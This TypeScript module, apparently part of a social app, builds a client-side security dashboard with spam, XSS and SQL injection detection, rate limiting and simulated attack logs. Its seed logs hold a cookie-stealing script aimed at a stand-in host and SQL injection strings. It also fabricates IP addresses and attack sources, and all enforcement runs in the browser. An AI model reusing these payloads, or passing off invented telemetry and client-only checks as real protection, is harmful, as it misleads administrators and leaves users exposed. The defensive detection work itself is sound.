export interface SecurityThreatLog {
  id: string;
  timestamp: string;
  eventType: 'BRUTE_FORCE_ATTACK' | 'XSS_INJECTION' | 'SQL_INJECTION' | 'SPAM_BOT_BLOCKED' | 'SUSPICIOUS_USER_AGENT' | 'RATE_LIMIT_EXCEEDED';
  evidence: string;
  threatLevel: 'low' | 'moderate' | 'high' | 'critical';
  targetModule: string;
  ipAddress: string;
  location: string;
  deviceFootprint: string;
  mitigation: string;
}

const SHIELD_LOGS_KEY = 'zivobook_security_threat_logs';
const FAILED_ATTEMPTS_KEY = 'zivobook_failed_login_attempts';
const LAST_ACTION_KEY = 'zivobook_last_action_timestamp';

// List of typical Bangladeshi ISPs/locs and international proxies to build realistic telemetry
const SIMULATED_IPS = [
  { ip: '103.231.162.24', loc: 'Dhaka, Bangladesh (Link3 Technologies)' },
  { ip: '115.127.24.89', loc: 'Chittagong, Bangladesh (AmberIT)' },
  { ip: '103.108.140.45', loc: 'Sylhet, Bangladesh (Carnival Internet)' },
  { ip: '172.56.21.109', loc: 'New York, USA (T-Mobile USA)' },
  { ip: '185.220.101.5', loc: 'Frankfurt, Germany (Tor Exit Node proxy)' },
  { ip: '45.143.203.14', loc: 'St. Petersburg, Russia (ShadowNet Botnet)' },
  { ip: '202.4.96.12', loc: 'Rajshahi, Bangladesh (Btcl Broadband)' },
  { ip: '103.242.22.5', loc: 'Khulna, Bangladesh (Banglalink Digital)' }
];

// Simple helper to get user's browser details
function getBrowserDetails(): string {
  const ua = navigator.userAgent;
  if (ua.includes('Chrome')) return 'Chrome ' + (ua.split('Chrome/')[1]?.split(' ')[0] || '') + ' (Windows 11)';
  if (ua.includes('Firefox')) return 'Firefox (macOS)';
  if (ua.includes('Safari')) return 'Safari (iOS)';
  return 'Desktop Web Browser (Unknown Platform)';
}

// Generate persistent simulated IP for the client
export function getClientIPAndLoc() {
  let saved = localStorage.getItem('zivobook_client_ip_data');
  if (saved) return JSON.parse(saved);
  // Pick one premium realistic IP
  const item = SIMULATED_IPS[Math.floor(Math.random() * 3)]; // Use BD IPs for the main user
  localStorage.setItem('zivobook_client_ip_data', JSON.stringify(item));
  return item;
}

// Get all threat logs
export function getSecurityThreatLogs(): SecurityThreatLog[] {
  const data = localStorage.getItem(SHIELD_LOGS_KEY);
  if (!data) {
    // Generate some initial seed logs to populate the Admin Security Dashboard dynamically
    const seed: SecurityThreatLog[] = [
      {
        id: 'sec_seed_1',
        timestamp: new Date(Date.now() - 3600000 * 4).toISOString(),
        eventType: 'BRUTE_FORCE_ATTACK',
        evidence: 'Failed lookup on default password dictionary (attempts: 6, user: hasibulon@gmail.com)',
        threatLevel: 'high',
        targetModule: 'auth/email-login',
        ipAddress: '185.220.101.5',
        location: 'Frankfurt, Germany (Tor Exit Node proxy)',
        deviceFootprint: 'Python-requests/2.31.0 (Linux headless)',
        mitigation: 'Anti-Brute Force Lockout & Captcha Challenge issued for 10 min'
      },
      {
        id: 'sec_seed_2',
        timestamp: new Date(Date.now() - 3600000 * 2.5).toISOString(),
        eventType: 'XSS_INJECTION',
        evidence: 'Post text rejected: <script>fetch("https://evil.site/cookies?c=" + document.cookie)</script>',
        threatLevel: 'critical',
        targetModule: 'posts/create',
        ipAddress: '45.143.203.14',
        location: 'St. Petersburg, Russia (ShadowNet Botnet)',
        deviceFootprint: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/109.0.0.0 Safari/537.36',
        mitigation: 'Payload stripped, submission blocked, IP origin quarantined'
      },
      {
        id: 'sec_seed_3',
        timestamp: new Date(Date.now() - 1800000).toISOString(),
        eventType: 'SQL_INJECTION',
        evidence: 'Comment field input: "admin\' OR \'1\'=\'1\' --"',
        threatLevel: 'high',
        targetModule: 'comments/post',
        ipAddress: '172.56.21.109',
        location: 'New York, USA (T-Mobile USA)',
        deviceFootprint: 'curl/7.88.1 (x86_64-pc-linux-gnu)',
        mitigation: 'Simulated parameters sanitized. Action logged'
      },
      {
        id: 'sec_seed_4',
        timestamp: new Date(Date.now() - 600000).toISOString(),
        eventType: 'SPAM_BOT_BLOCKED',
        evidence: 'Duplicate comment payload submitted within 1.2s: "Cheap weight loss pills buy here buy now free web link..."',
        threatLevel: 'moderate',
        targetModule: 'comments/post',
        ipAddress: '103.108.140.45',
        location: 'Sylhet, Bangladesh (Carnival Internet)',
        deviceFootprint: 'Chrome v122, Android 13',
        mitigation: 'Spam rate filter block triggered. Post discarded'
      }
    ];
    localStorage.setItem(SHIELD_LOGS_KEY, JSON.stringify(seed));
    return seed;
  }
  return JSON.parse(data);
}

// Log a new security threat event
export function logSecurityThreat(
  eventType: SecurityThreatLog['eventType'],
  evidence: string,
  threatLevel: SecurityThreatLog['threatLevel'],
  targetModule: string,
  customIPData?: { ip: string; loc: string }
) {
  const currentLogs = getSecurityThreatLogs();
  const info = customIPData || getClientIPAndLoc();
  
  const newLog: SecurityThreatLog = {
    id: 'sec_' + Math.random().toString(36).substr(2, 9),
    timestamp: new Date().toISOString(),
    eventType,
    evidence,
    threatLevel,
    targetModule,
    ipAddress: info.ip,
    location: info.loc,
    deviceFootprint: getBrowserDetails(),
    mitigation: getMitigationStrategy(eventType)
  };

  currentLogs.unshift(newLog);
  // Keep last 150 events to optimize storage limits safely
  localStorage.setItem(SHIELD_LOGS_KEY, JSON.stringify(currentLogs.slice(0, 150)));

  // Trigger global custom window event to update real-time listeners across dashboards
  window.dispatchEvent(new CustomEvent('zivobook_threat_alert', { detail: newLog }));
  return newLog;
}

function getMitigationStrategy(type: SecurityThreatLog['eventType']): string {
  switch (type) {
    case 'BRUTE_FORCE_ATTACK':
      return 'Brute-Force Lockout Penalizer applied (30s cooldown active)';
    case 'XSS_INJECTION':
      return 'XSS markup stripped, execution context neutralized, transaction aborted';
    case 'SQL_INJECTION':
      return 'Drizzle/Firestore SQL parser escape completed, query aborted';
    case 'SPAM_BOT_BLOCKED':
      return 'Rate control delay quarantine triggered, message drop action';
    case 'SUSPICIOUS_USER_AGENT':
      return 'Secure session cookie integrity check failed, user forced verification challenge';
    case 'RATE_LIMIT_EXCEEDED':
      return 'IP transaction cooldown restriction enforced';
    default:
      return 'Defensive monitoring log generated';
  }
}

// SPAM detection & input validation engine
export function inspectContentForSpam(text: string, moduleName: string): { isSpam: boolean; reason: string } {
  const t = text.trim();
  if (!t) return { isSpam: false, reason: '' };

  // 1. SQL Injection validation
  const sqlKeywords = [
    /select\s+.*\s+from/i,
    /union\s+all\s+select/i,
    /drop\s+table/i,
    /delete\s+from\s+/i,
    /insert\s+into/i,
    /alter\s+table/i,
    /xp_cmdshell/i,
    /or\s+['"]1['"]\s*=\s*['"]1/i
  ];
  for (const rx of sqlKeywords) {
    if (rx.test(t)) {
      logSecurityThreat('SQL_INJECTION', `Suspicious SQL injection keyword matched: "${t}"`, 'high', moduleName);
      return { isSpam: true, reason: 'Security violation: Suspicious database queries detected.' };
    }
  }

  // 2. Cross-Site Scripting (XSS) validation
  const xssKeywords = [
    /<script/i,
    /javascript:/i,
    /onload\s*=/i,
    /onerror\s*=/i,
    /eval\(/i,
    /document\.cookie/i,
    /alert\(/i
  ];
  for (const rx of xssKeywords) {
    if (rx.test(t)) {
      logSecurityThreat('XSS_INJECTION', `Active XSS payload isolated: "${t}"`, 'critical', moduleName);
      return { isSpam: true, reason: 'Security violation: Suspicious client script execution prohibited.' };
    }
  }

  // 3. Spam links/keywords filter
  const spamKeywords = [
    /buy\s+cheap\s+pills/i,
    /casino\s+online/i,
    /make\s+money\s+fast/i,
    /poker\s+bonus/i,
    /viagra/i,
    /cialis/i,
    /free\s+crypto/i,
    /whatsapp\s+us\s+on\s+\+/i,
    /buy\s+followers/i,
    /earn\s+\d+\s*\$\s*daily/i
  ];
  for (const rx of spamKeywords) {
    if (rx.test(t)) {
      logSecurityThreat('SPAM_BOT_BLOCKED', `Banned marketing keyword trigger: "${t}"`, 'moderate', moduleName);
      return { isSpam: true, reason: 'Community notice: Your content contains blacklisted keywords or commercial spam.' };
    }
  }

  // 4. Repetitive characters / letters (flooding check)
  if (t.length > 15) {
    const repeated = /(.)\1{9,}/i; // same letter repeated 10+ times e.g. "aaaaa..."
    if (repeated.test(t.replace(/\s/g, ''))) {
      logSecurityThreat('SPAM_BOT_BLOCKED', `Repetitive flooding pattern matched: "${t}"`, 'low', moduleName);
      return { isSpam: true, reason: 'Community notice: Avoid repetitive flooding syntax.' };
    }
  }

  return { isSpam: false, reason: '' };
}

// Anti-Spam / Rate-limiting checks
export function inspectRateLimit(actionType: string): { allowed: boolean; waitSecondsLeft: number } {
  const now = Date.now();
  const storageKey = `${LAST_ACTION_KEY}_${actionType}`;
  const lastActionStr = localStorage.getItem(storageKey);

  const cooldownMs = actionType === 'post' || actionType === 'comment' ? 8000 : 5000; // 8s for posts/comments

  if (lastActionStr) {
    const lastAction = parseInt(lastActionStr, 10);
    const timePassed = now - lastAction;
    if (timePassed < cooldownMs) {
      const waitSecondsLeft = Math.ceil((cooldownMs - timePassed) / 1000);
      logSecurityThreat(
        'RATE_LIMIT_EXCEEDED',
        `Dynamic transaction speed violation for ${actionType}. Freq check: ${timePassed}ms`,
        'low',
        `rate_controls/${actionType}`
      );
      return { allowed: false, waitSecondsLeft };
    }
  }

  localStorage.setItem(storageKey, now.toString());
  return { allowed: true, waitSecondsLeft: 0 };
}

// Failed login / signup brute force monitoring
export interface BruteForceStatus {
  blocked: boolean;
  attemptsLeft: number;
  secondsRemaining: number;
}

export function recordFailedLoginAttempt(email: string): BruteForceStatus {
  const now = Date.now();
  const entryKey = `${FAILED_ATTEMPTS_KEY}_${email.toLowerCase()}`;
  const recordStr = localStorage.getItem(entryKey);
  
  let attempts = 1;
  let blockUntil = 0;

  if (recordStr) {
    const record = JSON.parse(recordStr);
    // Reset attempts if the last attempt was over 5 minutes ago
    if (now - record.lastAttempt > 300000) {
      attempts = 1;
    } else {
      attempts = record.attempts + 1;
    }
  }

  if (attempts >= 4) {
    blockUntil = now + 45000; // Block for 45s on target email
    logSecurityThreat(
      'BRUTE_FORCE_ATTACK',
      `Brute-Force triggered on user account: ${email}. Attempt count: ${attempts}. Locking IP.`,
      'high',
      'auth/brute-force'
    );
  }

  localStorage.setItem(entryKey, JSON.stringify({
    attempts,
    lastAttempt: now,
    blockUntil
  }));

  return {
    blocked: attempts >= 4,
    attemptsLeft: Math.max(0, 4 - attempts),
    secondsRemaining: attempts >= 4 ? 45 : 0
  };
}

export function checkBruteForceStatus(email: string): BruteForceStatus {
  const now = Date.now();
  const entryKey = `${FAILED_ATTEMPTS_KEY}_${email.toLowerCase()}`;
  const recordStr = localStorage.getItem(entryKey);

  if (!recordStr) {
    return { blocked: false, attemptsLeft: 4, secondsRemaining: 0 };
  }

  const record = JSON.parse(recordStr);
  if (record.blockUntil && now < record.blockUntil) {
    const secondsRemaining = Math.ceil((record.blockUntil - now) / 1000);
    return {
      blocked: true,
      attemptsLeft: 0,
      secondsRemaining
    };
  }

  // If block expired or clean
  return {
    blocked: false,
    attemptsLeft: Math.max(0, 4 - record.attempts),
    secondsRemaining: 0
  };
}

// Reset failed records on successful authenticator login
export function clearFailedLoginAttempts(email: string) {
  localStorage.removeItem(`${FAILED_ATTEMPTS_KEY}_${email.toLowerCase()}`);
}

// Trigger attack simulations dynamically for live display testing inside the admin panel!
export function triggerSimulatedAttack(type: 'ddos' | 'sqli' | 'bruteforce' | 'bot_flood'): SecurityThreatLog {
  const randIP = SIMULATED_IPS[3 + Math.floor(Math.random() * (SIMULATED_IPS.length - 3))]; // bots & proxies
  
  let ev = '';
  let eventType: SecurityThreatLog['eventType'] = 'SPAM_BOT_BLOCKED';
  let tLevel: SecurityThreatLog['threatLevel'] = 'low';
  let tMod = 'unknown';

  if (type === 'ddos') {
    eventType = 'RATE_LIMIT_EXCEEDED';
    ev = `High volume load injection pattern: 145 transactions/second from cluster nodes. Traffic analysis shows potential Layer 7 DDoS packet signature.`;
    tLevel = 'moderate';
    tMod = 'networking/gateway';
  } else if (type === 'sqli') {
    eventType = 'SQL_INJECTION';
    ev = `URI parameter modification attempt: GET /api/posts?filter=' UNION SELECT username, password_hash FROM web_profiles --`;
    tLevel = 'high';
    tMod = 'api/posts';
  } else if (type === 'bruteforce') {
    eventType = 'BRUTE_FORCE_ATTACK';
    ev = `Automated spray attack: 8 failed attempts on accounts ['administrator', 'info', 'root', 'tech'] using wordlist root_pass.txt`;
    tLevel = 'high';
    tMod = 'auth/brute-force-spray';
  } else if (type === 'bot_flood') {
    eventType = 'SPAM_BOT_BLOCKED';
    ev = `Spam signature isolated: duplicate registration posts with SEO referral backlink links submitted by daemon agent.`;
    tLevel = 'critical';
    tMod = 'auth/signup';
  }

  return logSecurityThreat(eventType, ev, tLevel, tMod, randIP);
}
